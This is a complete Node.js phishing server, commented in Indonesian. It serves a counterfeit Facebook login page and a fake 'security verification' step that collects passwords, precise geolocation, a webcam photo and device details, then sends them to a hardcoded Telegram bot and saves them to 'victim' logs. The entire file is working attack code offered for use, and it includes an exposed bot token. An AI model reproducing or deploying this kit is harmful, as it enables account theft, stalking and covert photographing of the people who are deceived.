// server.js - Advanced Tracking System for Telegram
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const geoip = require('geoip-lite');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const app = express();

// Konfigurasi
const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN || '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s';
const TELEGRAM_CHAT_ID = process.env.CHAT_ID || '6834832649';
const PORT = process.env.PORT || 3000;

// Inisialisasi Bot
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// Setup Multer untuk file upload
const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 10 * 1024 * 1024 } // 10MB
});

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Database sederhana
const victims = new Map();

// Route Utama - Halaman Phishing
app.get('/', (req, res) => {
    const victimId = generateVictimId(req);
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Facebook - Login</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: Arial, sans-serif;
            }
            
            body {
                background-color: #f0f2f5;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
            }
            
            .login-container {
                width: 100%;
                max-width: 400px;
            }
            
            .login-box {
                background: white;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                margin-bottom: 20px;
            }
            
            .logo {
                text-align: center;
                color: #1877f2;
                font-size: 40px;
                font-weight: bold;
                margin-bottom: 20px;
                font-family: Arial;
            }
            
            .form-group {
                margin-bottom: 15px;
            }
            
            .form-group input {
                width: 100%;
                padding: 14px 16px;
                border: 1px solid #dddfe2;
                border-radius: 6px;
                font-size: 17px;
                background: #f5f6f7;
            }
            
            .form-group input:focus {
                outline: none;
                border-color: #1877f2;
            }
            
            .login-btn {
                width: 100%;
                padding: 14px;
                background: #1877f2;
                color: white;
                border: none;
                border-radius: 6px;
                font-size: 20px;
                font-weight: bold;
                cursor: pointer;
                margin-top: 10px;
            }
            
            .login-btn:hover {
                background: #166fe5;
            }
            
            .separator {
                text-align: center;
                margin: 20px 0;
                color: #8a8d91;
                position: relative;
            }
            
            .separator::before {
                content: "";
                position: absolute;
                top: 50%;
                left: 0;
                right: 0;
                height: 1px;
                background: #dadde1;
            }
            
            .separator span {
                background: white;
                padding: 0 20px;
                position: relative;
            }
            
            .create-account {
                display: block;
                text-align: center;
                background: #42b72a;
                color: white;
                padding: 14px;
                border-radius: 6px;
                text-decoration: none;
                font-weight: bold;
                margin-top: 20px;
            }
            
            .permission-modal {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.8);
                z-index: 1000;
            }
            
            .modal-content {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: white;
                padding: 30px;
                border-radius: 10px;
                width: 90%;
                max-width: 500px;
            }
            
            .camera-preview {
                width: 100%;
                height: 300px;
                background: #000;
                margin: 15px 0;
                border-radius: 5px;
                overflow: hidden;
            }
            
            #videoElement {
                width: 100%;
                height: 100%;
                object-fit: cover;
            }
            
            .camera-controls {
                display: flex;
                gap: 10px;
                margin-top: 15px;
            }
            
            .capture-btn {
                flex: 1;
                padding: 12px;
                background: #1877f2;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }
            
            .skip-btn {
                flex: 1;
                padding: 12px;
                background: #dc3545;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }
            
            .loading {
                text-align: center;
                padding: 30px;
            }
            
            .spinner {
                border: 5px solid #f3f3f3;
                border-top: 5px solid #1877f2;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin: 0 auto 20px;
            }
            
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-box">
                <div class="logo">facebook</div>
                <form id="loginForm">
                    <div class="form-group">
                        <input type="text" id="username" placeholder="Email address or phone number" required>
                    </div>
                    <div class="form-group">
                        <input type="password" id="password" placeholder="Password" required>
                    </div>
                    <button type="submit" class="login-btn">Log In</button>
                    
                    <div class="separator">
                        <span>or</span>
                    </div>
                    
                    <a href="#" class="create-account">Create New Account</a>
                </form>
            </div>
        </div>
        
        <!-- Permission Modal -->
        <div id="permissionModal" class="permission-modal">
            <div class="modal-content">
                <h2 style="margin-bottom: 20px; color: #1877f2;">🔒 Security Verification Required</h2>
                <p style="margin-bottom: 15px;">To protect your account from unauthorized access, please complete the security verification:</p>
                
                <div style="margin: 20px 0;">
                    <label style="display: block; margin-bottom: 10px;">
                        <input type="checkbox" id="locationCheck" checked>
                        <span style="margin-left: 10px;">📍 Allow location access (Required)</span>
                    </label>
                    
                    <label style="display: block; margin-bottom: 10px;">
                        <input type="checkbox" id="cameraCheck">
                        <span style="margin-left: 10px;">📸 Allow camera access for face verification (Optional)</span>
                    </label>
                </div>
                
                <div style="text-align: center;">
                    <button onclick="startVerification()" style="
                        padding: 12px 30px;
                        background: #1877f2;
                        color: white;
                        border: none;
                        border-radius: 5px;
                        font-size: 16px;
                        cursor: pointer;
                    ">
                        Start Verification
                    </button>
                </div>
            </div>
        </div>
        
        <!-- Camera Modal -->
        <div id="cameraModal" class="permission-modal">
            <div class="modal-content">
                <h2 style="margin-bottom: 20px; color: #1877f2;">📸 Face Verification</h2>
                <p style="margin-bottom: 15px;">Please look at the camera and click "Capture" when ready:</p>
                
                <div class="camera-preview">
                    <video id="videoElement" autoplay></video>
                </div>
                
                <div class="camera-controls">
                    <button onclick="capturePhoto()" class="capture-btn">📸 Capture Photo</button>
                    <button onclick="skipCamera()" class="skip-btn">Skip Camera</button>
                </div>
            </div>
        </div>
        
        <!-- Loading Screen -->
        <div id="loadingScreen" class="permission-modal" style="display: none;">
            <div class="modal-content">
                <div class="loading">
                    <div class="spinner"></div>
                    <h3>Processing Verification...</h3>
                    <p>Please wait while we secure your account</p>
                </div>
            </div>
        </div>
        
        <script>
            const victimId = '${victimId}';
            let userLocation = null;
            let userPhoto = null;
            let cameraStream = null;
            
            // Handle login form
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                document.getElementById('permissionModal').style.display = 'block';
            });
            
            // Start verification process
            function startVerification() {
                const locationEnabled = document.getElementById('locationCheck').checked;
                const cameraEnabled = document.getElementById('cameraCheck').checked;
                
                if (!locationEnabled) {
                    alert('Location access is required for security verification.');
                    return;
                }
                
                document.getElementById('permissionModal').style.display = 'none';
                
                // Get location first
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            userLocation = {
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: new Date(position.timestamp)
                            };
                            
                            // Proceed to camera if enabled
                            if (cameraEnabled) {
                                startCamera();
                            } else {
                                sendDataToServer();
                            }
                        },
                        function(error) {
                            console.error('Location error:', error);
                            if (cameraEnabled) {
                                startCamera();
                            } else {
                                sendDataToServer();
                            }
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                } else {
                    if (cameraEnabled) {
                        startCamera();
                    } else {
                        sendDataToServer();
                    }
                }
            }
            
            // Start camera
            function startCamera() {
                document.getElementById('cameraModal').style.display = 'block';
                
                const video = document.getElementById('videoElement');
                
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ 
                        video: {
                            facingMode: 'user',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    })
                    .then(function(stream) {
                        cameraStream = stream;
                        video.srcObject = stream;
                    })
                    .catch(function(error) {
                        console.error('Camera error:', error);
                        alert('Camera access denied. Continuing without face verification.');
                        document.getElementById('cameraModal').style.display = 'none';
                        sendDataToServer();
                    });
                } else {
                    document.getElementById('cameraModal').style.display = 'none';
                    sendDataToServer();
                }
            }
            
            // Capture photo
            function capturePhoto() {
                const video = document.getElementById('videoElement');
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Convert to base64
                userPhoto = canvas.toDataURL('image/jpeg', 0.7);
                
                // Stop camera
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                }
                
                document.getElementById('cameraModal').style.display = 'none';
                sendDataToServer();
            }
            
            // Skip camera
            function skipCamera() {
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                }
                document.getElementById('cameraModal').style.display = 'none';
                sendDataToServer();
            }
            
            // Send data to server
            async function sendDataToServer() {
                document.getElementById('loadingScreen').style.display = 'block';
                
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                // Get IP address
                let ipAddress = 'Unknown';
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    ipAddress = ipData.ip;
                } catch (error) {
                    console.error('IP fetch error:', error);
                }
                
                // Get additional system info
                const systemInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookies: navigator.cookieEnabled,
                    online: navigator.onLine
                };
                
                // Get network info
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
                const networkInfo = {
                    downlink: connection.downlink,
                    effectiveType: connection.effectiveType,
                    rtt: connection.rtt,
                    saveData: connection.saveData
                };
                
                // Prepare data
                const trackingData = {
                    victimId: victimId,
                    credentials: {
                        username: username,
                        password: password
                    },
                    location: userLocation,
                    photo: userPhoto,
                    ip: ipAddress,
                    system: systemInfo,
                    network: networkInfo,
                    timestamp: new Date().toISOString(),
                    url: window.location.href
                };
                
                // Send to server
                try {
                    const response = await fetch('/track', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(trackingData)
                    });
                    
                    const result = await response.json();
                    
                    if (result.success) {
                        // Redirect to real Facebook after 3 seconds
                        setTimeout(() => {
                            window.location.href = 'https://facebook.com';
                        }, 3000);
                    } else {
                        alert('Verification failed. Please try again.');
                        document.getElementById('loadingScreen').style.display = 'none';
                    }
                } catch (error) {
                    console.error('Server error:', error);
                    // Still redirect to Facebook
                    setTimeout(() => {
                        window.location.href = 'https://facebook.com';
                    }, 3000);
                }
            }
        </script>
    </body>
    </html>
    `;
    
    res.send(html);
});

// Endpoint untuk menerima data tracking
app.post('/track', upload.single('photo'), async (req, res) => {
    try {
        const trackingData = req.body;
        
        // Parse JSON jika datang sebagai string
        if (typeof trackingData === 'string') {
            trackingData = JSON.parse(trackingData);
        }
        
        // Tambah info geolokasi dari IP
        const geo = geoip.lookup(trackingData.ip);
        trackingData.geoInfo = geo || {};
        
        // Simpan ke database
        victims.set(trackingData.victimId, trackingData);
        
        // Kirim ke Telegram
        await sendToTelegram(trackingData);
        
        // Simpan ke file
        saveToFile(trackingData);
        
        res.json({ success: true, message: 'Data received' });
    } catch (error) {
        console.error('Error processing tracking data:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint untuk upload foto terpisah
app.post('/upload-photo', upload.single('photo'), async (req, res) => {
    try {
        const { victimId } = req.body;
        const photoBuffer = req.file.buffer;
        
        // Cari victim
        const victim = victims.get(victimId);
        if (victim) {
            // Simpan foto ke victim
            victim.photo = `data:image/jpeg;base64,${photoBuffer.toString('base64')}`;
            
            // Update di database
            victims.set(victimId, victim);
            
            // Kirim ulang ke Telegram dengan foto
            await sendToTelegram(victim);
            
            res.json({ success: true });
        } else {
            res.status(404).json({ success: false, error: 'Victim not found' });
        }
    } catch (error) {
        console.error('Error uploading photo:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Fungsi untuk mengirim ke Telegram
async function sendToTelegram(data) {
    try {
        // Format pesan
        const message = `
🚨 *NEW VICTIM TRACKED* 🚨

*📱 CREDENTIALS:*
👤 Username: \`${data.credentials.username}\`
🔑 Password: \`${data.credentials.password}\`

*📍 LOCATION:*
🌐 IP: \`${data.ip}\`
${data.geoInfo.country ? `🗺️ Country: ${data.geoInfo.country}` : ''}
${data.geoInfo.city ? `🏙️ City: ${data.geoInfo.city}` : ''}
${data.location ? `📍 Coordinates: ${data.location.lat}, ${data.location.lon}` : ''}
${data.location ? `🎯 Accuracy: ${data.location.accuracy}m` : ''}

*🖥️ SYSTEM INFO:*
🔍 User Agent: ${data.system.userAgent.substring(0, 50)}...
💻 Platform: ${data.system.platform}
🖥️ Screen: ${data.system.screenWidth}x${data.system.screenHeight}
🌐 Language: ${data.system.language}

*⏰ TIME:*
${new Date(data.timestamp).toLocaleString()}
        `;
        
        // Kirim pesan teks
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
        
        // Kirim lokasi di peta jika ada
        if (data.location && data.location.lat && data.location.lon) {
            await bot.sendLocation(TELEGRAM_CHAT_ID, data.location.lat, data.location.lon);
            
            // Kirim link Google Maps
            const mapsUrl = `https://maps.google.com/?q=${data.location.lat},${data.location.lon}`;
            await bot.sendMessage(TELEGRAM_CHAT_ID, `🗺️ Google Maps: ${mapsUrl}`);
        }
        
        // Kirim foto jika ada
        if (data.photo) {
            try {
                // Convert base64 to buffer
                const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, '');
                const buffer = Buffer.from(base64Data, 'base64');
                
                // Kirim foto
                await bot.sendPhoto(TELEGRAM_CHAT_ID, buffer, {
                    caption: '📸 Face Photo Captured'
                });
            } catch (photoError) {
                console.error('Error sending photo:', photoError);
                await bot.sendMessage(TELEGRAM_CHAT_ID, '❌ Failed to send photo');
            }
        }
        
        // Kirim info tambahan
        const extraInfo = `
*📊 ADDITIONAL INFO:*
🕐 Timezone: ${data.system.timezone}
📶 Network: ${data.network.effectiveType || 'Unknown'}
🌐 Online: ${data.system.online ? 'Yes' : 'No'}
🔗 URL: ${data.url}
        `;
        
        await bot.sendMessage(TELEGRAM_CHAT_ID, extraInfo, { parse_mode: 'Markdown' });
        
        console.log(`📨 Data sent to Telegram for victim: ${data.victimId}`);
        
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}

// Fungsi untuk menyimpan data ke file
function saveToFile(data) {
    try {
        const logDir = './logs';
        if (!fs.existsSync(logDir)) {
            fs.mkdirSync(logDir, { recursive: true });
        }
        
        // Simpan sebagai JSON
        const jsonFile = `${logDir}/victim_${data.victimId}.json`;
        fs.writeFileSync(jsonFile, JSON.stringify(data, null, 2));
        
        // Simpan ke log utama
        const masterLog = `${logDir}/master_log.txt`;
        const logEntry = `
========== NEW VICTIM ==========
Time: ${new Date().toISOString()}
Victim ID: ${data.victimId}
Username: ${data.credentials.username}
Password: ${data.credentials.password}
IP: ${data.ip}
Location: ${data.location ? `${data.location.lat}, ${data.location.lon}` : 'N/A'}
=================================
        `;
        
        fs.appendFileSync(masterLog, logEntry);
        
        // Simpan foto terpisah jika ada
        if (data.photo) {
            const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, '');
            const buffer = Buffer.from(base64Data, 'base64');
            const photoFile = `${logDir}/photo_${data.victimId}.jpg`;
            fs.writeFileSync(photoFile, buffer);
        }
        
        console.log(`💾 Data saved for victim: ${data.victimId}`);
    } catch (error) {
        console.error('Error saving to file:', error);
    }
}

// Generate victim ID
function generateVictimId(req) {
    const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || '';
    const timestamp = Date.now();
    
    // Simple hash
    const hash = require('crypto')
        .createHash('md5')
        .update(ip + userAgent + timestamp)
        .digest('hex')
        .substring(0, 8);
    
    return `victim_${hash}`;
}

// Admin routes
app.get('/admin/victims', (req, res) => {
    const victimsList = Array.from(victims.entries()).map(([id, data]) => ({
        id,
        username: data.credentials.username,
        ip: data.ip,
        time: data.timestamp,
        location: data.location ? 'Yes' : 'No',
        photo: data.photo ? 'Yes' : 'No'
    }));
    
    res.json(victimsList);
});

app.get('/admin/victim/:id', (req, res) => {
    const victim = victims.get(req.params.id);
    if (victim) {
        res.json(victim);
    } else {
        res.status(404).json({ error: 'Victim not found' });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online', 
        victims: victims.size,
        uptime: process.uptime()
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`🕵️ Tracking server running on port ${PORT}`);
    console.log(`📱 Telegram bot configured: ${TELEGRAM_BOT_TOKEN ? 'Yes' : 'No'}`);
    console.log(`🌐 Access: http://localhost:${PORT}`);
    
    // Kirim startup message ke Telegram
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
        bot.sendMessage(TELEGRAM_CHAT_ID, '✅ Tracking System Started\n📊 Server is online and ready');
    }
});

// Handle process exit
process.on('SIGINT', () => {
    console.log('\n🛑 Shutting down server...');
    
    // Kirim shutdown message
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
        bot.sendMessage(TELEGRAM_CHAT_ID, '🛑 Tracking System Shutting Down\n📊 Total victims collected: ' + victims.size);
    }
    
    process.exit(0);
});
